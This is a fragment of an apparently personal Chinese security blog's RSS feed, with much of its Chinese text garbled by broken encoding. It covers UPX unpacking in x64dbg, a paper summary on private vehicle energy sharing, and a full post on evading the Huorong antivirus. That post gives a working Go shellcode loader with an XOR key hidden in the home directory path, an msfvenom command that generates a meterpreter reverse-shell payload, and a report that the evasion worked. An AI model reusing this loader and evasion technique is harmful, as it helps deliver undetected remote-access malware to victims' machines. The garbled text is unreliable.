			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;ç»§ç»­ â€œF9â€ æ‰§è¡Œä»£ç ï¼Œæ­¤æ—¶å¯ä»¥çœ‹åˆ°ç¨‹åºåœåœ¨äº† OEP å…¥å£å¤„ï¼ˆ0x00409E23ï¼‰&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 185; 
			flex-basis: 445px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142604392.png&#34; data-size=&#34;2560x1378&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142604392.png&#34;
			width=&#34;2560&#34;
			height=&#34;1378&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142604392_hu15711857234930093310.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142604392_hu4026674609122015220.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;6-ä¿®å¤iatè¡¨&#34;&gt;6. ä¿®å¤IATè¡¨
&lt;/h1&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 86; 
			flex-basis: 206px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142721637.png&#34; data-size=&#34;678x787&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142721637.png&#34;
			width=&#34;678&#34;
			height=&#34;787&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142721637_hu5693294612690678288.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142721637_hu15046219043055967705.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;è®¾ç½®OEPåœ°å€-&amp;gt; IAT Autosearch -&amp;gt; Get Imports -&amp;gt; Dump -&amp;gt; Fix Dump&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 723; 
			flex-basis: 1737px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142851944.png&#34; data-size=&#34;883x122&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142851944.png&#34;
			width=&#34;883&#34;
			height=&#34;122&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142851944_hu13374587704180570463.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628142851944_hu10149744396245832797.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 127; 
			flex-basis: 306px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628143014197.png&#34; data-size=&#34;1419x1111&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628143014197.png&#34;
			width=&#34;1419&#34;
			height=&#34;1111&#34;
			srcset=&#34;https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628143014197_hu7434757141217660380.png 480w, https://id-none.github.io/2024/upx%E8%84%B1%E5%A3%B3%E5%88%9D%E6%8E%A2x64dbg/image-20240628143014197_hu7035804935062864507.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Goè¯­è¨€ShellCodeå…æ€ç«ç»’</title>
        <link>https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</link>
        <pubDate>Mon, 03 Jun 2024 16:22:34 +0800</pubDate>
        
        <guid>https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/</guid>
        <description>&lt;img src="https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603162742164.png" alt="Featured image of post Goè¯­è¨€ShellCodeå…æ€ç«ç»’" /&gt;&lt;h1 id=&#34;1--shellcode-åŠ è½½å™¨go&#34;&gt;1.  Shellcode åŠ è½½å™¨ï¼ˆgoï¼‰
&lt;/h1&gt;&lt;p&gt;æˆ‘ä»¬å…ˆçœ‹æœ€åçš„å…æ€ä»£ç &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import (
	&amp;quot;fmt&amp;quot;
	&amp;quot;os&amp;quot;
	&amp;quot;syscall&amp;quot;
	&amp;quot;unsafe&amp;quot;
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.NewLazyDLL(&amp;quot;kernel32.dll&amp;quot;)
	ntdll         = syscall.NewLazyDLL(&amp;quot;ntdll.dll&amp;quot;)
	VirtualAlloc  = kernel32.NewProc(&amp;quot;VirtualAlloc&amp;quot;)
	RtlCopyMemory = ntdll.NewProc(&amp;quot;RtlCopyMemory&amp;quot;)
	//shellcode_buf = []byte{
	//}
	shellcode_buf = []byte{
	}
)

func check(e error) {
	if e != nil {
		if e.Error() != &amp;quot;The operation completed successfully.&amp;quot; { // å†…å­˜é”™è¯¯
			fmt.Println(e.Error())
			os.Exit(1)
		}
	}
}

func main() {
	//// xor
	homeDir, _ := os.UserHomeDir()
	xor := homeDir[3] // U -&amp;gt; 85
	decimalValue := int(xor)
	shellcode := xorEncrypt(shellcode_buf, decimalValue)
	//shellcode := shellcode_buf

	fmt.Println(shellcode)
	// ç”³è¯·å†…å­˜
	// MEM_COMMIT|MEM_RESERVE
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		check(err)
	}
	// å†™å…¥shellcode
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;amp;shellcode[0])), uintptr(len(shellcode)))
	check(err)

	// æ‰§è¡Œshellcode
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func xorEncrypt(buf []byte, value int) []byte {
	for i := 0; i &amp;lt; len(buf); i++ {
		buf[i] ^= byte(value)
	}
	return buf
}

// go build -ldflags=&amp;quot;-H windowsgui -w -s&amp;quot; shellcodeLoader.go

&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;2-shellcode-ç”Ÿæˆ&#34;&gt;2. shellcode ç”Ÿæˆ
&lt;/h1&gt;&lt;p&gt;å¯¹äºshellcodeçš„ç”Ÿæˆæˆ‘ä»¬é‡‡ç”¨msfè¿›è¡Œç”Ÿæˆï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xxxx LPORT=xxxx -f c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯¹äºç”Ÿæˆçš„shellcodeï¼Œæˆ‘ä»¬å¦‚æœä¸è¿›è¡Œå¤„ç†ï¼Œå¯¹äºç«ç»’è¿™ç±»çš„æ€æ¯’è½¯ä»¶æ¥è¯´ï¼Œåšç®€å•çš„é™æ€åˆ†æï¼Œå¦‚æœåšæŒåˆ°0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50Â·Â·Â·è¿™äº›å…³é”®å­—èŠ‚ï¼Œè‚¯å®šä¼šæŠ¥æ¯’ï¼šBackdoor/W64.Meterpreter.f&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 314; 
			flex-basis: 754px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34; data-size=&#34;761x242&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34;
			width=&#34;761&#34;
			height=&#34;242&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu13638370721843017092.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu2798833134595910052.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;3å¯èƒ½çš„ç»•è¿‡æ–¹å¼&#34;&gt;3.å¯èƒ½çš„ç»•è¿‡æ–¹å¼
&lt;/h1&gt;&lt;p&gt;ä¸€èˆ¬æ¥è¯´ï¼Œä¸ºäº†é˜²æ­¢shellcodeè¢«æ£€æµ‹åˆ°ï¼Œæˆ‘ä»¬é€šè¿‡å¯¹shellcodeè¿›è¡Œå¤„ç†ï¼Œå¦‚base64åŠ å¯†ï¼Œäº¦æˆ–ç­‰ç­‰æ“ä½œï¼Œä¹Ÿå¯ä»¥è€ƒè™‘githubçš„sgnå·¥å…·ã€‚&lt;/p&gt;
&lt;p&gt;æœ¬æ–‡æˆ‘ä»¬ä¸»è¦é‡‡ç”¨äº¦æˆ–æ“ä½œï¼ˆxorï¼‰&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆå°†msfç”Ÿæˆçš„shellcodeè¿›è¡Œäº¦æˆ–æ“ä½œï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# xor.py 
shellcode = []

# xor 85
shellcode1 = &#39;&#39;.join([&#39;\\x%02x&#39; % i for i in shellcode])
print(shellcode1)
for i in range(len(shellcode)):
    shellcode[i] ^= 85

# 0xæ ¼å¼åŒ–è¾“å‡º
shellcode = &#39;&#39;.join([&#39;\\x%02x&#39; % i for i in shellcode])
print(shellcode)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 615; 
			flex-basis: 1478px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537.png&#34; data-size=&#34;2476x402&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537.png&#34;
			width=&#34;2476&#34;
			height=&#34;402&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537_hu5249771822563492932.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603164348537_hu5910632486674011798.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å†å°†shellcodeè¿›è¡Œæ›¿æ¢ï¼Œå¹¶ä¸”ä¸ç›®æ ‡å€¼è¿›è¡Œäº¦æˆ–ï¼Œå°±å¯ä»¥è·å¾—æ­£ç¡®çš„shellcodeã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯å½“æˆ‘ä»¬è¿›è¡Œç¼–è¯‘çš„æ—¶å€™ï¼Œä»»ç„¶æŠ¥æ¯’ã€‚&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 314; 
			flex-basis: 754px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34; data-size=&#34;761x242&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472.png&#34;
			width=&#34;761&#34;
			height=&#34;242&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu13638370721843017092.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603163500472_hu2798833134595910052.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;
shellcode := xorEncrypt(shellcode_buf, 85)

func xorEncrypt(buf []byte, value int) []byte {
	for i := 0; i &amp;lt; len(buf); i++ {
		buf[i] ^= byte(value)
	}
	return buf
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ˜¯ç”±äºç«ç»’åœ¨æ£€æµ‹çš„æ—¶å€™å¦‚æœèƒ½æ˜ç¡®çœ‹åˆ°85ï¼Œä¼šå°è¯•äº¦æˆ–æ¥è¿˜åŸshellcodeï¼Œbase64åŒç†ã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥æˆ‘ä»¬å°±å°è¯•å¦‚æœéšè—85ï¼Œé€šè¿‡è¯»å–ç”¨æˆ·ç›®å½•æ¥è·å–ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;
	homeDir, _ := os.UserHomeDir()
	xor := homeDir[3] // U -&amp;gt; 85
	decimalValue := int(xor)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ­¤æ—¶ï¼Œshellcodeæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯åœ¨è¿›è¡Œç¼–è¯‘çš„æ—¶å€™ä¼šé‡åˆ°å†…å­˜çš„æŠ¥æ¯’ï¼š&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 309; 
			flex-basis: 741px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696.png&#34; data-size=&#34;776x251&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696.png&#34;
			width=&#34;776&#34;
			height=&#34;251&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696_hu11939858661195890870.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165148696_hu17901365803499758145.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªåŸå› æ˜¯æˆ‘ä»¬åœ¨ç”³è¯·å†…å­˜æ—¶ï¼Œè®¾ç½®å†…å­˜æƒé™ä¸ºMEM_COMMIT|MEM_RESERVEï¼›&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 254; 
			flex-basis: 611px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430.png&#34; data-size=&#34;1100x432&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430.png&#34;
			width=&#34;1100&#34;
			height=&#34;432&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430_hu7069117773989795382.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165231430_hu4159307438650186210.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 529; 
			flex-basis: 1270px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028.png&#34; data-size=&#34;1631x308&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028.png&#34;
			width=&#34;1631&#34;
			height=&#34;308&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028_hu4740495117857859404.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165236028_hu18383027260707193865.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å°†å†…å­˜æƒé™è®¾ç½®ä¸ºMEM_COMMITå°±å¯ä»¥äº†ã€‚&lt;/p&gt;
&lt;h1 id=&#34;4-å…æ€æ•ˆæœ&#34;&gt;4. å…æ€æ•ˆæœ
&lt;/h1&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 166; 
			flex-basis: 398px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345.png&#34; data-size=&#34;1023x616&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345.png&#34;
			width=&#34;1023&#34;
			height=&#34;616&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345_hu11057556029165390164.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165452345_hu7884649830339844576.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹èƒ½å¦ä¸Šçº¿&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 162; 
			flex-basis: 390px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224.png&#34; data-size=&#34;1299x799&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224.png&#34;
			width=&#34;1299&#34;
			height=&#34;799&#34;
			srcset=&#34;https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224_hu6386907720073067038.png 480w, https://id-none.github.io/2024/go%E8%AF%AD%E8%A8%80shellcode%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92/image-20240603165603224_hu15496909413846274933.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-æ€»ç»“&#34;&gt;5. æ€»ç»“
&lt;/h1&gt;&lt;p&gt;è¿™æ˜¯ç¬¬ä¸€æ¬¡å°è¯•å…æ€ï¼Œä¹‹å‰ä¸€ç›´åœ¨å­¦ä¹ pwnå’Œwebå®‰å…¨ï¼Œä½†æ˜¯åœ¨å‰æ®µæ—¶é—´çš„ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç£çŸ³è¡ŒåŠ¨çš„æ¯”èµ›ä¸­ï¼Œå‘ç°å†…ç½‘ä¸­å­˜åœ¨æ€æ¯’è½¯ä»¶ï¼Œä¸”æ— æ³•åŠæ—¶ç»•è¿‡ï¼Œè™½ç„¶é€šè¿‡æ–‡ä»¶åŒ…å«è¯»å–åˆ°äº†flagï¼Œä½†æ˜¯å´é˜»æ­¢äº†æˆ‘ä»¬è¿›ä¸€æ­¥çš„æ¸—é€åˆ©ç”¨ï¼Œæœ€åä¹Ÿåªè·å¾—äº†ç¬¬åä¸€åï¼Œä¸å†³èµ›é—æ†¾é”™è¿‡ã€‚&lt;/p&gt;
&lt;p&gt;å›æ¥ä¹‹åï¼Œåæ€äº†å¾ˆå¤šï¼Œè§‰å¾—è¿˜æ˜¯è¦å¯¹å…æ€è¿›è¡Œä¸€éƒ¨åˆ†çš„å­¦ä¹ ï¼Œgoè¯­è¨€çš„shellcodeå…æ€é€šè¿‡å¾®ä¿¡æ¨æ–‡çœ‹åˆ°çš„ï¼Œå†³å®šæŒºæœ‰æ„æ€çš„ï¼Œä¾¿åœ¨ä¹‹åçš„å­¦ä¹ ä¸­è¿›è¡Œå°è¯•ï¼Œæ²¡æƒ³åˆ°å°±æˆåŠŸç»•è¿‡äº†ç«ç»’ï¼ˆå…¶ä»–æ€æ¯’è½¯ä»¶è¿˜æ²¡æœ‰å°è¯•è¿‡ï¼‰ï¼Œä½†æ˜¯è¿™ä¹Ÿæ¿€èµ·äº†æˆ‘å­¦ä¹ çš„çƒ­æƒ…ã€‚&lt;/p&gt;
&lt;p&gt;æ­¤å¤–ï¼Œæœ€è¿‘ä¹Ÿæ”¶åˆ°äº†å®éªŒå®¤å¯¼å¸ˆçš„ä»»åŠ¡ï¼Œç»™æœ¬ç§‘ç”ŸåŒå­¦ä»¬å‡†å¤‡æ¸—é€æµ‹è¯•ï¼ˆCTFï¼‰çš„è¯¾ç¨‹ï¼Œä¹Ÿè§‰å¾—å…æ€è›®é‡è¦çš„ï¼Œé¡ºä¾¿ä¹Ÿä¸€èµ·ç»™è®²äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å­¦æ— æ­¢å¢ƒï¼Œè„šè¸å®åœ°ã€‚&lt;/strong&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method</title>
        <link>https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/</link>
        <pubDate>Fri, 17 May 2024 14:27:25 +0800</pubDate>
        
        <guid>https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/</guid>
        <description>&lt;img src="https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517144025453.png" alt="Featured image of post Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method" /&gt;&lt;h1 id=&#34;v2vç”µè½¦èƒ½é‡äº¤æ¢&#34;&gt;V2Vç”µè½¦èƒ½é‡äº¤æ¢
&lt;/h1&gt;&lt;p&gt;Vehicle-to-Vehicle Energy Sharing Scheme: A Privacy-Preserving Solution based on Local Differential Privacy Method&lt;/p&gt;
&lt;p&gt;è´¡çŒ®ç‚¹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è‡ªé€‚åº”éšç§é¢„ç®—åˆ†é…( Adaptive Privacy Budget Allocationï¼ŒAPA )æ¨¡å‹ï¼Œé€šè¿‡éšç§é¢„ç®—åˆ†é…æ¥å¹³è¡¡æ•°æ®å¤±çœŸå’Œéšç§æ³„éœ²é£é™©ã€‚&lt;/li&gt;
&lt;li&gt;å¹³è¡¡æ•°æ®éšç§ä¿æŠ¤æ°´å¹³å’Œæ•°æ®æ•ˆç”¨çš„é«˜æ•ˆç”¨æ‰°åŠ¨( HUP )æ¨¡å‹ã€‚&lt;/li&gt;
&lt;li&gt;æ”¹è¿›è½¨è¿¹éšç§ä¿æŠ¤çš„éšç§åŠ æƒå¹³å‡( PWA )æ¨¡å‹ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 101; 
			flex-basis: 242px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752.png&#34; data-size=&#34;671x663&#34;&gt;
		&lt;img src=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752.png&#34;
			width=&#34;671&#34;
			height=&#34;663&#34;
			srcset=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752_hu13377655088549744554.png 480w, https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143556752_hu15176021189869584182.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Implementation of VES scheme&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Implementation of VES scheme&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;apaæ¨¡å‹-è‡ªé€‚åº”éšç§è®¡ç®—åˆ†é…æ¨¡å‹-ç”¨æ¥å¹³è¡¡å™ªå£°å’Œä¿¡æ¯å¯ç”¨æ€§&#34;&gt;APAæ¨¡å‹ è‡ªé€‚åº”éšç§è®¡ç®—åˆ†é…æ¨¡å‹ &lt;strong&gt;ç”¨æ¥å¹³è¡¡å™ªå£°å’Œä¿¡æ¯å¯ç”¨æ€§&lt;/strong&gt;
&lt;/h2&gt;&lt;p&gt;åŸå§‹ä½ç½®ç»å†LDPï¼ˆæœ¬åœ°å·®åˆ†éšç§ï¼‰æ‰°åŠ¨ã€æ·»åŠ å™ªå£°ã€‘ã€‚ä½¿ç”¨é«˜æ–¯æ ¸å‡½æ•°å’Œå“ˆæ›¼é¡¿è·ç¦»æ¥è¡¡é‡ä¸¤ä¸ªä½ç½®ä¹‹é—´çš„ç›¸ä¼¼æ€§ï¼ˆSï¼Œå…¬å¼1ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 158; 
			flex-basis: 381px&#34;
	&gt;
	&lt;a href=&#34;https://id-none.github.io/2024/vehicle-to-vehicle-energy-sharing-scheme-a-privacy-preserving-solution-based-on-local-differential-privacy-method/image-20240517143658121.png&#34; data-size=&#34;659x415&#34;&gt;
